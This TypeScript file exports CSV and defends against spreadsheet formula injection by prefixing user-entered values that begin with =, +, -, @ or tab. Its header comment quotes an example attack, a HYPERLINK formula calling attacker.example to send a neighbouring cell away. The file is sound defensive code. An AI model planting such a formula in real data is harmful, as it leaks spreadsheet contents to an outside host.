/*
 * CSV export.
 *
 * spec/03: "CSV UTF-8 with BOM, CRLF rows, RFC4180 quoting. For user-entered
 * values whose first non-whitespace char is =,+,-,@ or tab, prefix a single
 * quote before CSV escaping. Header order matches API ReportRow schema.
 * Include ISO UTC timestamps and a timezone column."
 *
 * The prefix rule is a safety measure, not a formatting one. A spreadsheet
 * treats a cell beginning `=` as a formula, so a learner who types
 * `=HYPERLINK("http://attacker.example?"&A1,"Click")` into their display name
 * would have that formula run in the manager's spreadsheet — reading the row
 * beside it and sending it away. Prefixing an apostrophe makes the cell text.
 */

/** The characters a spreadsheet may read as the start of a formula. */
const FORMULA_STARTERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * Neutralises a value a person typed. Only user-entered fields go through
 * this: an ISO timestamp beginning with a digit needs no defending, and
 * prefixing it would corrupt the data it holds.
 */
export function neutralizeFormula(value: string): string {
  const firstVisible = value.trimStart()[0];
  return firstVisible !== undefined && FORMULA_STARTERS.has(firstVisible) ? `'${value}` : value;
}

/**
 * RFC 4180: a field is quoted when it holds a comma, a quote, or a line break,
 * and an embedded quote is doubled. Quoting more than that is harmless, but
 * quoting less is not.
 */
export function escapeField(value: string): string {
  if (/[",\r\n]/.test(value)) return `"${value.replace(/"/g, '""')}"`;
  return value;
}

export interface CsvColumn<T> {
  header: string;
  /** Read the value. Return null for an empty cell. */
  value: (row: T) => string | number | boolean | null;
  /**
   * True when the value can contain text a person typed. Those are defended
   * against formula injection; machine-generated values are not, so that they
   * survive the round trip unchanged.
   */
  userEntered?: boolean;
}

/**
 * The whole file, as a string. A BOM so Excel opens UTF-8 correctly, and CRLF
 * rows because RFC 4180 says so and because some readers need it.
 */
export function toCsv<T>(columns: readonly CsvColumn<T>[], rows: readonly T[]): string {
  const lines = [columns.map((column) => escapeField(column.header)).join(",")];

  for (const row of rows) {
    lines.push(
      columns
        .map((column) => {
          const raw = column.value(row);
          if (raw === null || raw === undefined) return "";
          const text = String(raw);
          return escapeField(column.userEntered ? neutralizeFormula(text) : text);
        })
        .join(",")
    );
  }

  return `﻿${lines.join("\r\n")}\r\n`;
}
